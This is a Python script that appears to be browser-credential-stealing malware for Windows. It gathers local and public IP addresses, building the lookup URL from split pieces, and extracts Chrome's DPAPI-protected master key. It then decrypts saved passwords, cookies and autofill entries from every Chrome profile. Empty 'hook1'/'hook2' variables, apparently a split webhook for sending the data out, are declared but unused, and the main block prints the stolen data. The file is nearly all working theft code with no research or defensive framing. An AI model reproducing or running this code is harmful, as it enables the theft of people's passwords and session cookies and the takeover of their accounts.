import socket
import requests
import netifaces
import os
import json
import base64
import sqlite3
import shutil
import datetime
from Crypto.Cipher import AES
import win32crypt

hook1 = ""
hook2 = ""

fullhook = hook1 + hook2

#local IP Stuff
def get_local_ips():
    local_ips = []
    for interface in netifaces.interfaces():
        try:
            addresses = netifaces.ifaddresses(interface)
            if socket.AF_INET in addresses:
                for addr_info in addresses[socket.AF_INET]:
                    local_ips.append(addr_info['addr'])
        except KeyError:
            pass
    formatter = "Local IP(s):\n - "
    # Join the IPs with newline and dash
    return formatter + "\n - ".join(local_ips)

#public IP stuff
def get_pub_ip():
    url1 = "api"
    url2 = "ipify"
    url3 = "org"
    dot = "."
    pub_ip = requests.get("https://" + url1 + dot + url2 + dot + url3)
    formatter = "Public IP:\n - "
    return formatter + pub_ip.text

#Chrome stuff
def get_master_key(user_data_path):
    local_state_path = os.path.join(user_data_path, "Local State")
    with open(local_state_path, "r", encoding='utf-8') as f:
        local_state = json.load(f)
    encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
    encrypted_key = base64.b64decode(encrypted_key_b64)[5:]  # Remove DPAPI
    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return master_key

def decrypt_password(buff, master_key):
    try:
        if buff[:3] == b'v10':
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)[:-16]
            return decrypted_pass.decode()
        else:
            return "[Unsupported Format]"
    except Exception as e:
        return f"[Decryption failed] {str(e)}"

def get_profiles(user_data_path):
    ignore = {"System Profile", "Crashpad", "Guest Profile", "Safe Browsing"}
    return [folder for folder in os.listdir(user_data_path)
            if os.path.isdir(os.path.join(user_data_path, folder)) and
            (folder.startswith("Profile") or folder == "Default") and
            folder not in ignore]

def extract_from_sqlite(db_path, query, columns):
    data = []
    if not os.path.exists(db_path):
        return data
    tmp_path = db_path + "_tmp"
    shutil.copy2(db_path, tmp_path)
    try:
        conn = sqlite3.connect(tmp_path)
        cursor = conn.cursor()
        cursor.execute(query)
        for row in cursor.fetchall():
            entry = {columns[i]: row[i] for i in range(len(columns))}
            data.append(entry)
        cursor.close()
        conn.close()
    finally:
        os.remove(tmp_path)
    return data

def decrypt_all_profiles():
    user_data_path = os.path.join(os.environ["LOCALAPPDATA"], r"Google\Chrome\User Data")
    master_key = get_master_key(user_data_path)
    profiles = get_profiles(user_data_path)

    timestamp = datetime.datetime.now().strftime("logged_%d-%m-%y_%H-%M-%S.txt")
    output_lines = []

    for profile in profiles:
        profile_path = os.path.join(user_data_path, profile)
        output_lines.append(f"\n--------- User: {profile} - PASSWORDS ----------")
        login_db = os.path.join(profile_path, "Login Data")
        login_data = extract_from_sqlite(
            login_db,
            "SELECT origin_url, username_value, password_value FROM logins",
            ["url", "username", "password_encrypted"]
        )
        for entry in login_data:
            password = decrypt_password(entry["password_encrypted"], master_key)
            output_lines.append(f"Site: {entry['url']}\nUsername: {entry['username']}\nPassword: {password}\n")

        output_lines.append(f"\n--------- User: {profile} - COOKIES ----------")
        cookies_db = os.path.join(profile_path, "Cookies")
        cookies = extract_from_sqlite(
            cookies_db,
            "SELECT host_key, name, encrypted_value FROM cookies",
            ["host", "name", "value_encrypted"]
        )
        for cookie in cookies:
            value = decrypt_password(cookie["value_encrypted"], master_key)
            output_lines.append(f"Host: {cookie['host']}\nName: {cookie['name']}\nValue: {value}\n")

        output_lines.append(f"\n--------- User: {profile} - AUTOFILL ----------")
        web_data_db = os.path.join(profile_path, "Web Data")
        autofill = extract_from_sqlite(
            web_data_db,
            "SELECT name, value FROM autofill",
            ["field", "value"]
        )
        for field in autofill:
            output_lines.append(f"Field: {field['field']}\nValue: {field['value']}\n")
    return "\n".join(output_lines)


if __name__ == "__main__":
        print(get_local_ips())
        print(get_pub_ip())
        print(decrypt_all_profiles())
        g = input("Hi!")

